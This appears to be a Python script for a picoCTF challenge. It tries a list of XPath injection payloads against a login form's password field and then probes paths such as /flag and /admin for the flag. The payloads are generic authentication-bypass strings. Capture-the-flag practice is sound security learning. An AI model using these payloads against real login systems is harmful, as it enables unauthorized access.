import requests
base = 'http://wily-courier.picoctf.net:49463'

# Test XPath injection in login form
payloads = [
    "' or '1'='1",
    "' or true() or '",
    "' or 1=1 or '",
    '" or ""="',
    "x' or 1=1 or 'x'='y",
    "' or '1'='1' --",
]
for p in payloads:
    s = requests.Session()
    r = s.post(base, data={'name': 'admin', 'pass': p})
    if 'Login failure' not in r.text:
        print(f'XPath possible with pass={p!r}: length={len(r.content)}, cookies={dict(s.cookies)}')
        # Check all pages with session
        for path in ['/flag', '/home', '/dashboard', '/admin', '/secret']:
            r2 = s.get(base + path)
            if r2.status_code != 404:
                print(f'  {path}: {r2.status_code} len={len(r2.content)}')
                if 'picoCTF' in r2.text:
                    print(f'  FLAG: {r2.text[:500]}')

# Also check if session alone changes behavior
print('\n---Checking session behavior---')
s = requests.Session()
r = s.get(base)
print(f'With session, no x param: len={len(r.content)}')
r2 = s.get(base, params={'x': 'test'})
print(f'With session, x=test: len={len(r2.content)}')